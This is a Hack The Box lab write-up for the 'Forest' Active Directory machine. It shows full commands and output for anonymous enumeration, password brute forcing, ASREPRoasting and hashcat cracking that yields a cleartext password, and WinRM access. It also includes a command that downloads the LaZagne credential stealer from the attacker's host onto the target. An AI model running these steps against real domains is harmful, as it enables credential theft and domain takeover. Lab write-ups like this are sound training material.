---
title: "HTB Forest Writeup"
description: In this box, we use RPC and LDAP to collect valid AD usernames. This allows us to perform ASREPRoasting, which yields a TGS that can be cracked. With these credentials, we can winRM into the machine. From the output of BloodHound, we learn that we can run ourselves into Exchange Windows Permissions, which has WriteDACL over the domain object. We grant ourselves full control over the domain and perform DCSync on the machine. Like this, we get an admin shell.
date: 2026-02-24T22:01:54-05:00
image: 7dedecb452597150647e73c2dd6c24c7.png
tags:
    - HTB
categories:
    - htb-writeups
comments: false
---
## Port Scan
1. Full TCP port scan
```sh
sudo nmap -Pn 10.129.191.98 -sS -p- --min-rate 20000 -oN nmap/fullportscan.nmap
```
Output:
```
Host is up (0.021s latency).
Not shown: 65367 closed tcp ports (reset), 144 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49683/tcp open  unknown
49698/tcp open  unknown
60699/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.69 seconds
```
2. Script and version scan
```sh
sudo nmap -Pn 10.129.191.98 -sC -sV -sS -p53,135,139,445 --min-rate 20000 -oN nmap/scriptversionscan.nmap
```
Output:
```
Host is up (0.022s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-01-31 01:08:37Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-31T01:08:40
|_  start_date: 2026-01-31T00:02:52
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h46m50s, deviation: 4h37m10s, median: 6m48s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2026-01-30T17:08:44-08:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.43 seconds

```
- Interesting
3. UDP scan
```sh
sudo nmap -Pn 10.129.191.98 -sU -p- --min-rate 20000 
```
Output:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-30 18:59 EST
Nmap scan report for 10.129.191.98
Host is up.
All 65535 scanned ports on 10.129.191.98 are in ignored states.
Not shown: 65535 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
```

## SMB
1. The SMB share allows anonymous logins. But somehow, we cannot list the shares.
```
netexec smb 10.129.191.98 -u '' -p ''
SMB         10.129.191.98   445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:True)
SMB         10.129.191.98   445    NONE             [+] \: 
```

```
smbclient -N -L \\\\10.129.191.98 -m SMB3
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.191.98 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- Future me: Run with Guest and a fake account with no password too.
2. I ran `enum4linux` in the background.
```SH
enum4linux 10.129.191.98 -A -C
```
Output:
```
 =========================================( Target Information )=========================================

Target ........... 10.129.191.98
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.129.191.98 )===========================


[E] Can't find workgroup/domain



 ===============================( Nbtstat Information for 10.129.191.98 )===============================

Looking up status of 10.129.191.98
No reply from 10.129.191.98

 ===================================( Session Check on 10.129.191.98 )===================================


[+] Server 10.129.191.98 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.129.191.98 )================================

Domain Name: HTB                                
Domain Sid: S-1-5-21-3072663084-364016917-1341370565

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.129.191.98 )==================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.129.191.98 from srvinfo:  
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.129.191.98 )=======================================

index: 0x2137 RID: 0x463 acb: 0x00020015 Account: $331000-VK4ADACQNUCA  Name: (null)    Desc: (null)
index: 0xfbc RID: 0x1f4 acb: 0x00000010 Account: Administrator  Name: Administrator     Desc: Built-in account for administering the computer/domain
index: 0x2369 RID: 0x47e acb: 0x00000210 Account: andy  Name: Andy Hislip       Desc: (null)
index: 0xfbe RID: 0x1f7 acb: 0x00000215 Account: DefaultAccount Name: (null)    Desc: A user account managed by the system.
index: 0xfbd RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0x2352 RID: 0x478 acb: 0x00000210 Account: HealthMailbox0659cc1  Name: HealthMailbox-EXCH01-010   Desc: (null)
index: 0x234b RID: 0x471 acb: 0x00000210 Account: HealthMailbox670628e  Name: HealthMailbox-EXCH01-003   Desc: (null)
index: 0x234d RID: 0x473 acb: 0x00000210 Account: HealthMailbox6ded678  Name: HealthMailbox-EXCH01-005   Desc: (null)
index: 0x2351 RID: 0x477 acb: 0x00000210 Account: HealthMailbox7108a4e  Name: HealthMailbox-EXCH01-009   Desc: (null)
index: 0x234c RID: 0x472 acb: 0x00000210 Account: HealthMailbox968e74d  Name: HealthMailbox-EXCH01-004   Desc: (null)                                                            19:11:30 [229/531]
index: 0x2350 RID: 0x476 acb: 0x00000210 Account: HealthMailboxb01ac64  Name: HealthMailbox-EXCH01-008   Desc: (null)
index: 0x234a RID: 0x470 acb: 0x00000210 Account: HealthMailboxc0a90c9  Name: HealthMailbox-EXCH01-002   Desc: (null)
index: 0x2348 RID: 0x46e acb: 0x00000210 Account: HealthMailboxc3d7722  Name: HealthMailbox-EXCH01-Mailbox-Database-1118319013   Desc: (null)
index: 0x2349 RID: 0x46f acb: 0x00000210 Account: HealthMailboxfc9daad  Name: HealthMailbox-EXCH01-001   Desc: (null)
index: 0x234f RID: 0x475 acb: 0x00000210 Account: HealthMailboxfd87238  Name: HealthMailbox-EXCH01-007   Desc: (null)
index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0x2360 RID: 0x47a acb: 0x00000210 Account: lucinda       Name: Lucinda Berger    Desc: (null)
index: 0x236a RID: 0x47f acb: 0x00000210 Account: mark  Name: Mark Brandt       Desc: (null)
index: 0x236b RID: 0x480 acb: 0x00000210 Account: santi Name: Santi Rodriguez   Desc: (null)
index: 0x235c RID: 0x479 acb: 0x00000210 Account: sebastien     Name: Sebastien Caron   Desc: (null)
index: 0x215a RID: 0x468 acb: 0x00020011 Account: SM_1b41c9286325456bb  Name: Microsoft Exchange Migration       Desc: (null)
index: 0x2161 RID: 0x46c acb: 0x00020011 Account: SM_1ffab36a2f5f479cb  Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}        Desc: (null)
index: 0x2156 RID: 0x464 acb: 0x00020011 Account: SM_2c8eef0a09b545acb  Name: Microsoft Exchange Approval Assistant      Desc: (null)
index: 0x2159 RID: 0x467 acb: 0x00020011 Account: SM_681f53d4942840e18  Name: Discovery Search Mailbox   Desc: (null)
index: 0x2158 RID: 0x466 acb: 0x00020011 Account: SM_75a538d3025e4db9a  Name: Microsoft ExchangeDesc: (null)
index: 0x215c RID: 0x46a acb: 0x00020011 Account: SM_7c96b981967141ebb  Name: E4E Encryption Store - Active      Desc: (null)
index: 0x215b RID: 0x469 acb: 0x00020011 Account: SM_9b69f1b9d2cc45549  Name: Microsoft Exchange Federation Mailbox      Desc: (null)
index: 0x215d RID: 0x46b acb: 0x00020011 Account: SM_c75ee099d0a64c91b  Name: Microsoft ExchangeDesc: (null)
index: 0x2157 RID: 0x465 acb: 0x00020011 Account: SM_ca8c2ed5bdab4dc9b  Name: Microsoft ExchangeDesc: (null)
index: 0x2365 RID: 0x47b acb: 0x00010210 Account: svc-alfresco  Name: svc-alfresco      Desc: (null)

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]

 =================================( Share Enumeration on 10.129.191.98 )=================================

do_connect: Connection to 10.129.191.98 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.191.98


 ===========================( Password Policy Information for 10.129.191.98 )===========================



[+] Attaching to 10.129.191.98 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.129.191.98)

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] HTB
        [+] Builtin

[+] Password Info for Domain: HTB

        [+] Minimum password length: 7
        [+] Password history length: 24
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: 1 day 4 minutes 
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes  
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:
Password Complexity: Disabled                                                                                                                                                    19:16:40 [121/531]
Minimum Password Length: 7                                                                                                                                                                         
                                                                                                                                                                                                   

 ======================================( Groups on 10.129.191.98 )======================================


[+] Getting builtin groups:

group:[Account Operators] rid:[0x224]
group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
group:[Incoming Forest Trust Builders] rid:[0x22d]
group:[Windows Authorization Access Group] rid:[0x230]
group:[Terminal Server License Servers] rid:[0x231]
group:[Administrators] rid:[0x220]
group:[Users] rid:[0x221]
group:[Guests] rid:[0x222]
group:[Print Operators] rid:[0x226]
group:[Backup Operators] rid:[0x227]
group:[Replicator] rid:[0x228]
group:[Remote Desktop Users] rid:[0x22b]
group:[Network Configuration Operators] rid:[0x22c]
group:[Performance Monitor Users] rid:[0x22e]
group:[Performance Log Users] rid:[0x22f]
group:[Distributed COM Users] rid:[0x232]
group:[IIS_IUSRS] rid:[0x238]
group:[Cryptographic Operators] rid:[0x239]
group:[Event Log Readers] rid:[0x23d]
group:[Certificate Service DCOM Access] rid:[0x23e]
group:[RDS Remote Access Servers] rid:[0x23f]
group:[RDS Endpoint Servers] rid:[0x240]
group:[RDS Management Servers] rid:[0x241]
group:[Hyper-V Administrators] rid:[0x242]
group:[Access Control Assistance Operators] rid:[0x243]
group:[Remote Management Users] rid:[0x244]
group:[System Managed Accounts Group] rid:[0x245]
group:[Storage Replica Administrators] rid:[0x246]
group:[Server Operators] rid:[0x225]

[+]  Getting builtin group memberships:

Group: Network Configuration Operators' (RID: 556) has member: cli_rpc_pipe_open_noauth: rpc_pipe_bind for pipe lsarpc failed with error NT_STATUS_IO_TIMEOUT
Group: Network Configuration Operators' (RID: 556) has member: Could not initialise lsa pipe
Group: Users' (RID: 545) has member: Couldn't lookup SIDs
Group: Guests' (RID: 546) has member: Couldn't lookup SIDs
Group: Print Operators' (RID: 550) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
Group: Windows Authorization Access Group' (RID: 560) has member: Couldn't lookup SIDs
Group: System Managed Accounts Group' (RID: 581) has member: Couldn't lookup SIDs
Group: RDS Management Servers' (RID: 577) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
Group: IIS_IUSRS' (RID: 568) has member: Couldn't lookup SIDs
Group: Administrators' (RID: 544) has member: Couldn't lookup SIDs
Group: Remote Management Users' (RID: 580) has member: Couldn't lookup SIDs
Group: Pre-Windows 2000 Compatible Access' (RID: 554) has member: Couldn't lookup SIDs
Group: Account Operators' (RID: 548) has member: Couldn't lookup SIDs

[+]  Getting local groups:
group:[RAS and IAS Servers] rid:[0x229]                                                                                                                                           19:22:43 [63/531]
group:[Allowed RODC Password Replication Group] rid:[0x23b]
group:[Denied RODC Password Replication Group] rid:[0x23c]
group:[DnsAdmins] rid:[0x44d]

[+]  Getting local group memberships:

Group: Denied RODC Password Replication Group' (RID: 572) has member: Couldn't lookup SIDs

[+]  Getting domain groups:

group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209] 
group:[Cloneable Domain Controllers] rid:[0x20a] 
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460] 
group:[Exchange Windows Permissions] rid:[0x461] 
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]

[+]  Getting domain group memberships:

Group: 'Domain Guests' (RID: 514) has member: HTB\Guest
Group: 'Privileged IT Accounts' (RID: 1149) has member: HTB\Service Accounts
Group: 'Public Folder Management' (RID: 1107) has member: Could not initialise pipe samr. Error was NT_STATUS_CONNECTION_DISCONNECTED
Group: 'Domain Controllers' (RID: 516) has member: HTB\FOREST$
Group: 'Read-only Domain Controllers' (RID: 521) has member: Could not connect to server 10.129.191.98
Group: 'Group Policy Creator Owners' (RID: 520) has member: HTB\Administrator                                                                                                      19:26:56 [1/531]
Group: 'Domain Users' (RID: 513) has member: HTB\Administrator
Group: 'Domain Users' (RID: 513) has member: HTB\DefaultAccount
Group: 'Domain Users' (RID: 513) has member: HTB\krbtgt
Group: 'Domain Users' (RID: 513) has member: HTB\$331000-VK4ADACQNUCA
Group: 'Domain Users' (RID: 513) has member: HTB\SM_2c8eef0a09b545acb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_ca8c2ed5bdab4dc9b
Group: 'Domain Users' (RID: 513) has member: HTB\SM_75a538d3025e4db9a
Group: 'Domain Users' (RID: 513) has member: HTB\SM_681f53d4942840e18
Group: 'Domain Users' (RID: 513) has member: HTB\SM_1b41c9286325456bb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_9b69f1b9d2cc45549
Group: 'Domain Users' (RID: 513) has member: HTB\SM_7c96b981967141ebb
Group: 'Domain Users' (RID: 513) has member: HTB\SM_c75ee099d0a64c91b
Group: 'Domain Users' (RID: 513) has member: HTB\SM_1ffab36a2f5f479cb
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc3d7722
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfc9daad
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxc0a90c9
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox670628e
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox968e74d
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox6ded678
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox83d6781
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxfd87238
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailboxb01ac64
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox7108a4e
Group: 'Domain Users' (RID: 513) has member: HTB\HealthMailbox0659cc1
Group: 'Domain Users' (RID: 513) has member: HTB\sebastien
Group: 'Domain Users' (RID: 513) has member: HTB\lucinda
Group: 'Domain Users' (RID: 513) has member: HTB\svc-alfresco
Group: 'Domain Users' (RID: 513) has member: HTB\andy
Group: 'Domain Users' (RID: 513) has member: HTB\mark
Group: 'Domain Users' (RID: 513) has member: HTB\santi
Group: 'Exchange Servers' (RID: 1118) has member: HTB\EXCH01$
Group: 'Exchange Servers' (RID: 1118) has member: HTB\$D31000-NSEL5BRJ63V7
Group: 'DnsUpdateProxy' (RID: 1102) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE
Group: 'Exchange Trusted Subsystem' (RID: 1119) has member: HTB\EXCH01$
Group: 'Managed Availability Servers' (RID: 1120) has member: HTB\EXCH01$
Group: 'Managed Availability Servers' (RID: 1120) has member: HTB\Exchange Servers
Group: 'Service Accounts' (RID: 1148) has member: HTB\svc-alfresco
Group: 'Schema Admins' (RID: 518) has member: lsaquery failed: NT_STATUS_IO_TIMEOUT
Group: '$D31000-NSEL5BRJ63V7' (RID: 1133) has member: HTB\EXCH01$
Group: 'Exchange Windows Permissions' (RID: 1121) has member: HTB\Exchange Trusted Subsystem

 ==================( Users on 10.129.191.98 via RID cycling (RIDS: 500-550,1000-1050) )==================


[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.


 ===============================( Getting printer info for 10.129.191.98 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Fri Jan 30 19:26:56 2026

```
2. I also set up a listener to capture NetNTLM hashes.
```sh
sudo responder -I tun0 -dvw 
```
- Nothing captured.
## RPC
1. From the output of `enum4linux`, I can see that the RPC allows anonymous logins.
```sh
rpcclient -N -U "" 10.129.191.98
```
2. We can list users with `enumdomusers` etc, but it has been covered by `enum4linux`. Might check back later.
## LDAP
1. Nice, LDAP allows anonymous logins too.
```SH
ldapsearch -b "" -s base \* + -H ldap://10.129.191.98 -x -LLL | tee ldapsearch_1.txt
```
2. Let's get all domain users
```SH
ldapsearch -H ldap://10.129.191.98 -x -b "DC=htb,DC=local" -s sub "(&(objectclass=user))" | tee ldapsearch_users.txt 
```
## Kerbrute
1. I tried to bruteforce the password of one user
```SH
./kerbrute bruteuser --dc 10.129.191.98 /usr/share/wordlists/rockyou.txt -d htb.local sebastien -v 
```
- Does not work
- Note from the future: Check the password policy before bruteforcing to prevent account lockout.
2. I also performed ASREPRoasting
```sh
impacket-GetNPUsers -usersfile /home/kali/hackthebox/Forest/availableUsers -dc-ip 10.129.191.98 htb.local/
```
- Remember to map `<ip> htb.local` in the `/etc/hosts`
Output:
Nothing
3. Here is a very interesting thing:
```
rpcclient $> enumdomusers
<SNIP>
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```
- The output of RPC shows `svc-alfresco`, but not LDAP
Once I put `svc-alfresco` in, we got a hit
```
<SNIP>
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:70ea7500342e6995f6e610d86d88bb70$72bb393b6820e1744a1f625ee26a4835ae4b551d26f9ff7fc932569c9bf0d7663f37e8dc3a8092c467bfc4328b8f94c8424b4638d19835ea234048cf912a00c5052ebd10b3e3a2c5bdbbfbcd3a894fb721c5d230e1a7d3faa95a9c1f46f32a2ae2dc8eecce9d46ffe61d8c8e9ad3b213e2bbe2b23375aa3bc4292720fa20978051293a04e8e5c8810cb6588c6fad65b45cc9b237d6a07ed344e38a587ccdeb4fa0f1400b9b234e698d489c6fcc2e2ab0e12b613b4c33f4c9621b8f12a6d1a30c42b24c11a8870699f7498757a0af3a00de0faa5225600f551af44934bd1fe91bd8702c95b2a1
```
- Note from the future: Don't trust LDAP only to list usernames. Check with RPC and SMB.
4. To crack the hash, use `hashcat` mode 18200
```sh
hashcat -m 18200 alfresco-asrep.hash /usr/share/wordlists/rockyou.txt 
```
Output:
```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:70<SNIP>bd8702c95b2a1:s3rvice
```
## SMB as svc-alfresco
1. Let's try to access SMB as `svc-alfresco`
```sh
netexec smb 10.129.191.98 -u svc-alfresco -p s3rvice --shares
```
Output:
```
SMB         10.129.191.98   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.129.191.98   445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.129.191.98   445    FOREST           [*] Enumerated shares
SMB         10.129.191.98   445    FOREST           Share           Permissions     Remark
SMB         10.129.191.98   445    FOREST           -----           -----------     ------
SMB         10.129.191.98   445    FOREST           ADMIN$                          Remote Admin
SMB         10.129.191.98   445    FOREST           C$                              Default share
SMB         10.129.191.98   445    FOREST           IPC$                            Remote IPC
SMB         10.129.191.98   445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.129.191.98   445    FOREST           SYSVOL          READ            Logon server share 
```
- We are in!
2. Let's see what are in those shares
```sh
netexec smb 10.129.191.98 -u svc-alfresco -p s3rvice -M spider_plus -o DOWNLOAD_FLAG=True
cat /tmp/nxc_hosted/nxc_spider_plus/10.129.191.98.json
```
- `DOWNLOAD_FLAG=True` will download all the files in the share.
Output:
```json
{
    "NETLOGON": {},
    "SYSVOL": {
        "htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2019-09-18 13:45:57",
            "ctime_epoch": "2019-09-18 13:45:57",
            "mtime_epoch": "2021-08-30 20:45:24",
            "size": "22 B"
        },
        "htb.local/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2019-09-18 13:45:57",
            "ctime_epoch": "2019-09-18 13:45:57",
            "mtime_epoch": "2021-08-30 20:45:23",
            "size": "1.07 KB"
        },
        "htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2019-09-18 13:45:57",
            "ctime_epoch": "2019-09-18 13:45:57",
            "mtime_epoch": "2019-09-19 07:11:35",
            "size": "22 B"
        },
        "htb.local/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2019-09-18 13:45:57",
            "ctime_epoch": "2019-09-18 13:45:57",
            "mtime_epoch": "2019-09-19 07:11:35",
            "size": "3.74 KB"
        }
    }
}  
```
- Nothing interesting
## WinRM as svc-alfresco
1. We can access WinRM 
```sh
netexec winrm 10.129.191.98 -u 'svc-alfresco' -p 's3rvice'
```
Output:
```
WINRM       10.129.191.98   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.191.98   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```
- Are we admin?
2. To access winrm,
```sh
evil-winrm -i 10.129.191.98 -u 'svc-alfresco' 
```
Output:
```
Enter Password: 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
```
## Credential Hunting
1. cmdkey
```
 cmdkey /list

Currently stored credentials:

* NONE *
```
- Future me: Cannot trust. Should manually check `C:\Users\<name>\AppData`
2. Windows autologon
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x5ea4c0cd
    ShutdownFlags    REG_DWORD    0x80000033
    DisableLockWorkstation    REG_DWORD    0x0
    DefaultDomainName    REG_SZ    HTB

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```
3. Lazagne
```sh
iwr -Uri "http://10.10.16.26:8000/LaZagne.exe" -OutFile "C:\users\svc-alfresco\LaZagne.exe"
./LaZagne.exe all 
```
Output:
```
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
